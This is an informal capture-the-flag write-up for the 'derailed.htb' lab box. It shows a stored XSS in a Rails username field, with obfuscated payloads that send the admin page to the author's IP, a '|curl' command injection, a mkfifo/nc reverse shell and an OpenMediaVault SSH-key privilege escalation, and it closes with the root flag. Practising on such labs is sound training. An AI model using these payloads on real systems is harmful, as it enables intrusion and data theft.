only 2 services 

22 and 3000 http


on the web page there's rails!


i found 2 nice things 

http://derailed.htb:3000/rails/info/properties
http://derailed.htb:3000/rails/info/routes
http://derailed.htb:3000/administration but we have to is admin

## Trying to get admin role 


I saw in the past that in registration flow there was a trick in rails that can lead to exfil admin content page ...




## Registration Process 


```http
POST /register HTTP/1.1
Host: derailed.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://derailed.htb:3000/register.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 220
Origin: http://derailed.htb:3000
Connection: close
Cookie: _simple_rails_session=juABz4QPgwvceDT4urH6%2Bpt0GpACnw17w%2F%2BbRRz4OLOzoDpSJR91vc%2F664nvucRx9c7tkKoyyc444LnOK1%2Fe475hXWg07ksn2wMkqC02PyNkcqY4goNIfWVVb6RsBedYK%2FW%2FDAxxZ7sDs4vV4PCzhWP6MJ0fbDRn88wkTKt4feRwpRmmw7DJdMcE71ahvonFu0A8IkKLcm8PGOEmCKwlLqjoypPN%2Fs8MePxw8bVh4FdW8PMqNzw%2B93QSdU%2Bzcf26aAOiMfkJW7W%2BWcbfEXfixiGM%2BIw1W3SV2amvo8s%3D--Gmukk1vQJHKvvb5n--IVzNTRYnOqXzc1EPF0sR8g%3D%3D
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

authenticity_token=Lafd0H-_1qZL8O4HhqP0gt3Zyf_PiuKmsfqW5S1IaRZQ5QS4HtJfGpJPKfMpOcysCHUlpAuonsFeiYhkBQPYxw&user%5Busername%5D=john&user%5Bpassword%5D=doe123&user%5Bpassword_confirmation%5D=doe123&role=administrator

```

as we can see the body has authenticity_token and than the usernamae,pass,confirm_pass

if i add &user%5Brole%5D=administrator 

not works ! 





## Once Registered 


Once registered you can only write notes! 

and i see the `<span></span>` can trigger xss! 


However, the cookies have been set to HttpOnly, meaning that stealing cookies is pointless in this case. XSS on the administrator could either allow us to enumerate more about the /administration page, or simply to steal his cookie and impersonate him.

Because this is clearly an XSS challenge, I thought of first finding a potential XSS entry.



## Finding XSS Point

I messed around a lot with the clipnotes  but it wasn't loading Javascript. 
Then I realised that the author of the clipnotes was something that I controlled. 
I could overflow the thing or try to register a malicious user. 

Since the page renders that username, this could potentially be vulnerable.

So I started a HTTP server, and attempted this:

```
user: ahahhahhahahahhahahhahahhahahahhahahahhahahha<script src=http://10.10.14.89/lol></script>
```


then tried to write note and then go on the clipnotes/raw! 



as i expected the user name can inject stored xss!


https://security.snyk.io/vuln/SNYK-RUBY-RAILSHTMLSANITIZER-3168647

i also found a cve!


rails-html-sanitizer to version <= 1.4.4 

https://hackerone.com/reports/1530898
`<select<style/><img src='http://10.10.14.28/c0derpwner>`






## Request for a new username that can trigger the stored xss

```
POST /register HTTP/1.1
Host: derailed.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://derailed.htb:3000/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 290
Origin: http://derailed.htb:3000
Connection: close
Cookie: _simple_rails_session=eazZgc7ylSdtx3h%2BRmRvVhwNFeVpZ%2BwCm16nuBEJVMKF7oo0sjk%2FUuv3fRBHSJ%2FSxKWst0HwcwuM7yncytHx%2B7c5i%2FodVUFPzx%2FtsUJg2lyN%2ByP2GU5EZiwWCLitKS%2FGljnfujTK1Rgzh8l0e6MwBww0v0%2F79zWx4q3ODebevOi1KFGYg2Pa6%2FW8ORpmmgKIVINXLOPN1g8uaRuSYuOj%2FkdjzRQyrFNhbjUpSu3rKJ5kiYHLuhW0zJJ%2BWy0Rs14fJpt0p8oRMbm%2Bn9CWfd59%2BOiJJZK9N%2FAB7kODv84%3D--J7e7sWz1JQYQRWHg--9NYh%2BMJycftSReiHse82qA%3D%3D
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

authenticity_token=DjKj4olPIR_rv2ZXiin2hOy29nilwz7sPjnD-0tlBLIg54DsW9SujKElRaw5O5wiS0d97xB7OcjBF1Wc1Ktwiw&user%5Busername%5D=c0derpwnerc0derpwnerc0derpwnerc0derpwnerc0derpwn<select<style/><img+src='http://10.10.14.93/c0derpwner'>&user%5Bpassword%5D=test&user%5Bpassword_confirmation%5D=test
```


The clipnotes trigger our callback ! 



## RCE ???

true flag inside charcode
```
POST /register HTTP/1.1
Host: derailed.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://derailed.htb:3000/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 1475
Origin: http://derailed.htb:3000
Connection: close
Cookie: _simple_rails_session=Gn9HpOqcRT%2B1pxiY7664ombe2%2FXvp61WA%2FtdBsk4gZUu9ANVZzRyrexj1mrnh2Mly5TKMbxhi4wB4CgBKtKZyMsnccMN1hChkHRgfNRzABML0iF52TXvn1%2BaMpMdEvAS77qOsA0Zfx79viehNMsXh8d3GHs6g33lpTH%2FaVNTmYKN3Szet1BgCcc6ioLb%2FsYCFntNDF1dCVg49Pbq9PaAM82T202GVbPvbzbmADIV7VGZarFAMatIpuhgjzsyV9STeQV9c8VtYt5z7%2BghoBKkkVDZ86vCFGT83vwzpuA%3D--7MXmuIiaCemf3E3c--Cdt9GwbsTjuguJC9MXtw7g%3D%3D
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

authenticity_token=IJ-T1VLMmlYH84yBg8GfaZzH2v7Vu_ZIucsC6v3T4MwOSrDbgFcVxU1pr3ow0_XPOzZRaWAD8WxG5ZSNYh2U9Q&user%5Busername%5D=c0derpwnerc0derpwnerc0derpwnerc0derpwnerc0derpwn<select<style/><img+src='http://10.10.14.93/c0derpwner'+onerror="eval(String.fromCharCode(118,97,114,32,117,114,108,32,61,32,34,104,116,116,112,58,47,47,100,101,114,97,105,108,101,100,46,104,116,98,58,51,48,48,48,47,97,100,109,105,110,105,115,116,114,97,116,105,111,110,34,59,10,118,97,114,32,99,111,100,101,114,32,61,32,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,57,51,47,104,111,111,107,34,59,10,118,97,114,32,120,104,114,32,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,104,114,46,111,110,114,101,97,100,121,115,116,97,116,101,99,104,97,110,103,101,32,61,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,105,102,32,40,120,104,114,46,114,101,97,100,121,83,116,97,116,101,32,61,61,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,46,68,79,78,69,41,32,123,10,32,32,32,32,32,32,32,32,102,101,116,99,104,40,99,111,100,101,114,32,43,32,34,63,34,32,43,32,101,110,99,111,100,101,85,82,73,40,98,116,111,97,40,120,104,114,46,114,101,115,112,111,110,115,101,84,101,120,116,41,41,41,10,32,32,32,32,125,10,125,10,120,104,114,46,111,112,101,110,40,39,71,69,84,39,44,32,117,114,108,44,32,116,114,117,101,41,59,10,120,104,114,46,115,101,110,100,40,110,117,108,108,41,59))">&user%5Bpassword%5D=tester1&user%5Bpassword_confirmation%5D=tester1
```

can trigger an ajax request with report 
so admin give us the admin page





now we have to exfil the admin page ... with a js payload! i think we can add something for seeing what's inside source code of the /administration

https://www.freecodecamp.org/news/here-is-the-most-popular-ways-to-make-an-http-request-in-javascript-954ce8c95aaa/


```js

var http = new XMLHttpRequest();
http.open("GET","http://10.10.14.93/call");
http.send(null);

```

```js
var url = "http://derailed.htb:3000/administration";
var coder = "http://10.10.14.93/hook";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(coder + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);

```



this can be b64 encoded and send it after the working payload of the xss


it's eval(String.fromCharCode()) :)


Finally after a lot of issues i was able to get administration page html source

and i found a possible xss couse the value point on a particular file .log


`<input type="text" class="form-control" name="report_log" value="report_12_01_2023.log" hidden>`

path : `http://deriled.htb:3000/administration/reports/report_log=../../../../../../../../var/www/rails-app/db/development.sqlite3`




default database is  database: db/development.sqlite3


## Trying LFI


```
POST /register HTTP/1.1
Host: derailed.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://derailed.htb:3000/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 1475
Origin: http://derailed.htb:3000
Connection: close
Cookie: _simple_rails_session=Gn9HpOqcRT%2B1pxiY7664ombe2%2FXvp61WA%2FtdBsk4gZUu9ANVZzRyrexj1mrnh2Mly5TKMbxhi4wB4CgBKtKZyMsnccMN1hChkHRgfNRzABML0iF52TXvn1%2BaMpMdEvAS77qOsA0Zfx79viehNMsXh8d3GHs6g33lpTH%2FaVNTmYKN3Szet1BgCcc6ioLb%2FsYCFntNDF1dCVg49Pbq9PaAM82T202GVbPvbzbmADIV7VGZarFAMatIpuhgjzsyV9STeQV9c8VtYt5z7%2BghoBKkkVDZ86vCFGT83vwzpuA%3D--7MXmuIiaCemf3E3c--Cdt9GwbsTjuguJC9MXtw7g%3D%3D
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

authenticity_token=IJ-T1VLMmlYH84yBg8GfaZzH2v7Vu_ZIucsC6v3T4MwOSrDbgFcVxU1pr3ow0_XPOzZRaWAD8WxG5ZSNYh2U9Q&user%5Busername%5D=c0derpwnerc0derpwnerc0derpwnerc0derpwnerc0derpwn<select<style/><img+src='http://10.10.14.93/c0derpwner'+onerror="eval(String.fromCharCode(118,97,114,32,117,114,108,32,61,32,34,104,116,116,112,58,47,47,100,101,114,97,105,108,101,100,46,104,116,98,58,51,48,48,48,47,97,100,109,105,110,105,115,116,97,116,105,111,110,47,118,97,114,47,119,119,119,47,114,97,105,108,115,45,97,112,112,47,100,98,47,100,101,118,101,108,111,112,109,101,110,116,46,115,113,108,105,116,101,51,34,59,10,118,97,114,32,99,111,100,101,114,32,61,32,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,57,51,47,104,111,111,107,34,59,10,118,97,114,32,120,104,114,32,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,104,114,46,111,110,114,101,97,100,121,115,116,97,116,101,99,104,97,110,103,101,32,61,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,105,102,32,40,120,104,114,46,114,101,97,100,121,83,116,97,116,101,32,61,61,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,46,68,79,78,69,41,32,123,10,32,32,32,32,32,32,32,32,102,101,116,99,104,40,99,111,100,101,114,32,43,32,34,63,34,32,43,32,101,110,99,111,100,101,85,82,73,40,98,116,111,97,40,120,104,114,46,114,101,115,112,111,110,115,101,84,101,120,116,41,41,41,10,32,32,32,32,125,10,125,10,120,104,114,46,111,112,101,110,40,39,71,69,84,39,44,32,117,114,108,44,32,116,114,117,101,41,59,10,120,104,114,46,115,101,110,100,40,110,117,108,108,41,59))">&user%5Bpassword%5D=celly&user%5Bpassword_confirmation%5D=celly
```


unfortunatly lfi it's not working couse to access the resouce we have to use the auth_token




so we have to do another op in ajax 

```js
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://derailed.htb:3000/administration", true);
xmlHttp.send( null );

setTimeout(function() {
    var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html');
    var token = doc.getElementById('authenticity_token').value;
    var newForm = new DOMParser().parseFromString('<form id="badform" method="post" action="/administration/reports">    <input type="hidden" name="authenticity_token" id="authenticity_token" value="placeholder" autocomplete="off">    <input id="report_log" type="text" class="form-control" name="report_log" value="placeholder" hidden="">    <button name="button" type="submit">Submit</button>', 'text/html');
    document.body.append(newForm.forms.badform);
    document.getElementById('badform').elements.report_log.value = '|curl http://10.10.14.93/curlcommand';
    document.getElementById('badform').elements.authenticity_token.value = token;
    document.getElementById('badform').submit();
}, 3000);
```



```

authenticity_token=IJ-T1VLMmlYH84yBg8GfaZzH2v7Vu_ZIucsC6v3T4MwOSrDbgFcVxU1pr3ow0_XPOzZRaWAD8WxG5ZSNYh2U9Q&user%5Busername%5D=c0derpwnerc0derpwnerc0derpwnerc0derpwnerc0derpwn<select<style/><img+src='http://10.10.14.93/c0derpwner'+onerror="eval(String.fromCharCode(118,97,114,32,120,109,108,72,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,109,108,72,116,116,112,46,111,112,101,110,40,32,34,71,69,84,34,44,32,34,104,116,116,112,58,47,47,100,101,114,97,105,108,101,100,46,104,116,98,58,51,48,48,48,47,97,100,109,105,110,105,115,116,114,97,116,105,111,110,34,44,32,116,114,117,101,41,59,10,120,109,108,72,116,116,112,46,115,101,110,100,40,32,110,117,108,108,32,41,59,10,10,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,118,97,114,32,100,111,99,32,61,32,110,101,119,32,68,79,77,80,97,114,115,101,114,40,41,46,112,97,114,115,101,70,114,111,109,83,116,114,105,110,103,40,120,109,108,72,116,116,112,46,114,101,115,112,111,110,115,101,84,101,120,116,44,32,39,116,101,120,116,47,104,116,109,108,39,41,59,10,32,32,32,32,118,97,114,32,116,111,107,101,110,32,61,32,100,111,99,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,97,117,116,104,101,110,116,105,99,105,116,121,95,116,111,107,101,110,39,41,46,118,97,108,117,101,59,10,32,32,32,32,118,97,114,32,110,101,119,70,111,114,109,32,61,32,110,101,119,32,68,79,77,80,97,114,115,101,114,40,41,46,112,97,114,115,101,70,114,111,109,83,116,114,105,110,103,40,39,60,102,111,114,109,32,105,100,61,34,98,97,100,102,111,114,109,34,32,109,101,116,104,111,100,61,34,112,111,115,116,34,32,97,99,116,105,111,110,61,34,47,97,100,109,105,110,105,115,116,114,97,116,105,111,110,47,114,101,112,111,114,116,115,34,62,32,32,32,32,60,105,110,112,117,116,32,116,121,112,101,61,34,104,105,100,100,101,110,34,32,110,97,109,101,61,34,97,117,116,104,101,110,116,105,99,105,116,121,95,116,111,107,101,110,34,32,105,100,61,34,97,117,116,104,101,110,116,105,99,105,116,121,95,116,111,107,101,110,34,32,118,97,108,117,101,61,34,112,108,97,99,101,104,111,108,100,101,114,34,32,97,117,116,111,99,111,109,112,108,101,116,101,61,34,111,102,102,34,62,32,32,32,32,60,105,110,112,117,116,32,105,100,61,34,114,101,112,111,114,116,95,108,111,103,34,32,116,121,112,101,61,34,116,101,120,116,34,32,99,108,97,115,115,61,34,102,111,114,109,45,99,111,110,116,114,111,108,34,32,110,97,109,101,61,34,114,101,112,111,114,116,95,108,111,103,34,32,118,97,108,117,101,61,34,112,108,97,99,101,104,111,108,100,101,114,34,32,104,105,100,100,101,110,61,34,34,62,32,32,32,32,60,98,117,116,116,111,110,32,110,97,109,101,61,34,98,117,116,116,111,110,34,32,116,121,112,101,61,34,115,117,98,109,105,116,34,62,83,117,98,109,105,116,60,47,98,117,116,116,111,110,62,39,44,32,39,116,101,120,116,47,104,116,109,108,39,41,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,40,110,101,119,70,111,114,109,46,102,111,114,109,115,46,98,97,100,102,111,114,109,41,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,98,97,100,102,111,114,109,39,41,46,101,108,101,109,101,110,116,115,46,114,101,112,111,114,116,95,108,111,103,46,118,97,108,117,101,32,61,32,39,124,99,117,114,108,32,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,57,51,47,114,99,101,99,102,109,101,100,39,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,98,97,100,102,111,114,109,39,41,46,101,108,101,109,101,110,116,115,46,97,117,116,104,101,110,116,105,99,105,116,121,95,116,111,107,101,110,46,118,97,108,117,101,32,61,32,116,111,107,101,110,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,98,97,100,102,111,114,109,39,41,46,115,117,98,109,105,116,40,41,59,10,125,44,32,51,48,48,48,41,59))">&user%5Bpassword%5D=celly&user%5Bpassword_confirmation%5D=celly

```
### Exec revshell 10.10.14.93 4444

with mkfifo and nc which has no append at all! 



```
118,97,114,32,120,109,108,72,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,109,108,72,116,116,112,46,111,112,101,110,40,32,34,71,69,84,34,44,32,34,104,116,116,112,58,47,47,100,101,114,97,105,108,101,100,46,104,116,98,58,51,48,48,48,47,97,100,109,105,110,105,115,116,114,97,116,105,111,110,34,44,32,116,114,117,101,41,59,10,120,109,108,72,116,116,112,46,115,101,110,100,40,32,110,117,108,108,32,41,59,10,10,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,118,97,114,32,100,111,99,32,61,32,110,101,119,32,68,79,77,80,97,114,115,101,114,40,41,46,112,97,114,115,101,70,114,111,109,83,116,114,105,110,103,40,120,109,108,72,116,116,112,46,114,101,115,112,111,110,115,101,84,101,120,116,44,32,39,116,101,120,116,47,104,116,109,108,39,41,59,10,32,32,32,32,118,97,114,32,116,111,107,101,110,32,61,32,100,111,99,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,97,117,116,104,101,110,116,105,99,105,116,121,95,116,111,107,101,110,39,41,46,118,97,108,117,101,59,10,32,32,32,32,118,97,114,32,110,101,119,70,111,114,109,32,61,32,110,101,119,32,68,79,77,80,97,114,115,101,114,40,41,46,112,97,114,115,101,70,114,111,109,83,116,114,105,110,103,40,39,60,102,111,114,109,32,105,100,61,34,98,97,100,102,111,114,109,34,32,109,101,116,104,111,100,61,34,112,111,115,116,34,32,97,99,116,105,111,110,61,34,47,97,100,109,105,110,105,115,116,114,97,116,105,111,110,47,114,101,112,111,114,116,115,34,62,32,32,32,32,60,105,110,112,117,116,32,116,121,112,101,61,34,104,105,100,100,101,110,34,32,110,97,109,101,61,34,97,117,116,104,101,110,116,105,99,105,116,121,95,116,111,107,101,110,34,32,105,100,61,34,97,117,116,104,101,110,116,105,99,105,116,121,95,116,111,107,101,110,34,32,118,97,108,117,101,61,34,112,108,97,99,101,104,111,108,100,101,114,34,32,97,117,116,111,99,111,109,112,108,101,116,101,61,34,111,102,102,34,62,32,32,32,32,60,105,110,112,117,116,32,105,100,61,34,114,101,112,111,114,116,95,108,111,103,34,32,116,121,112,101,61,34,116,101,120,116,34,32,99,108,97,115,115,61,34,102,111,114,109,45,99,111,110,116,114,111,108,34,32,110,97,109,101,61,34,114,101,112,111,114,116,95,108,111,103,34,32,118,97,108,117,101,61,34,112,108,97,99,101,104,111,108,100,101,114,34,32,104,105,100,100,101,110,61,34,34,62,32,32,32,32,60,98,117,116,116,111,110,32,110,97,109,101,61,34,98,117,116,116,111,110,34,32,116,121,112,101,61,34,115,117,98,109,105,116,34,62,83,117,98,109,105,116,60,47,98,117,116,116,111,110,62,39,44,32,39,116,101,120,116,47,104,116,109,108,39,41,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,40,110,101,119,70,111,114,109,46,102,111,114,109,115,46,98,97,100,102,111,114,109,41,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,98,97,100,102,111,114,109,39,41,46,101,108,101,109,101,110,116,115,46,114,101,112,111,114,116,95,108,111,103,46,118,97,108,117,101,32,61,32,39,124,114,109,32,47,116,109,112,47,102,59,109,107,102,105,102,111,32,47,116,109,112,47,102,59,99,97,116,32,47,116,109,112,47,102,124,115,104,32,45,105,32,50,62,38,49,124,110,99,32,49,48,46,49,48,46,49,52,46,57,51,32,52,52,52,52,32,62,47,116,109,112,47,102,39,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,98,97,100,102,111,114,109,39,41,46,101,108,101,109,101,110,116,115,46,97,117,116,104,101,110,116,105,99,105,116,121,95,116,111,107,101,110,46,118,97,108,117,101,32,61,32,116,111,107,101,110,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,98,97,100,102,111,114,109,39,41,46,115,117,98,109,105,116,40,41,59,10,125,44,32,51,48,48,48,41,59
```



## Privesc


we are rails user when we spawn shell trought execution ajax newDocument with that  !! 

i finded the default name of db in /var/www/rails-app/db/development.sqlite3

in this file there are 2 pass from alice and toby! in /etc/passwd toby i think it's the owner of openmediavault-webgui user

found an hash i cracked the pass "greenday" .


`su openvaultmedia-webgui` and put passwd


now i see a nice server in 127.0.0.1:80 chisel it's a webserver with omv service!


i notice a nice thing in /etc/openmediavault/config.xml 


`<sshpubkeys>` object! 



We can overwrite the config.xml with one crafted with ssh-keys! 

https://forum.openmediavault.org/index.php?thread/7822-guide-enable-ssh-with-public-key-authentication-securing-remote-webui-access-to/
`ssh-keygen -t rsa; ssh-keygen -e -f ~/.ssh/id_rsa`  to generate the needed key


Note that we need to add the <sshpubkey> tag because we are specifying a new object



than we can upload a new xml with the crafted info like root inside test and refresh the config

`./omv-confdbadm read conf.system.usermngmnt.user`



and then we have to force ssh `./omv-rpc -u admin "config" "applyChanges" "{ \"modules\": [\"ssh\"],\"force\":true}"`


now we can ssh easyly with `ssh root@derailed.htb` and now i got a shell with root permission!


```
ssh root@derailed.htb
The authenticity of host 'derailed.htb (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:2tql0UXpaDMuS+ebElTA+mVdK8ncQuHczEi8u/uMV7s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Warning: Permanently added 'derailed.htb' (ECDSA) to the list of known hosts.
Linux derailed 5.19.0-0.deb11.2-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.19.11-1~bpo11+1 (2022-10-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@derailed:~# cat /root/root.txt
cat /root/root.txt
bea58bf339ba091ebd35ca4983a86b24

```





















